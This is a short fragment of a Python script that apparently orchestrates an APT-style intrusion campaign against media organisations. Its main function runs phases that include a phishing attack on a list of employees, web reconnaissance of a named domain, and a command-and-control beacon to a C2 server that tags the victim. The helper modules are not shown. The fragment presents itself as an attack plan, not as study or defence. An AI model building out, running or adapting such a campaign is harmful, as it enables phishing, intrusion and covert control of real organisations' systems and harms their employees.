...
def main():
    """
    Main function to run the media_organization_campaign campaign.
    """
    print(f"[*] Starting media_organization_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("media_organizations_employees.txt")
    run_tool("apt_web_recon.js", "--target media_organizations.com")
    ...
    command_control.send_beacon(c2_server, "VICTIM-MEDIA_ORGANIZATIONS-01")
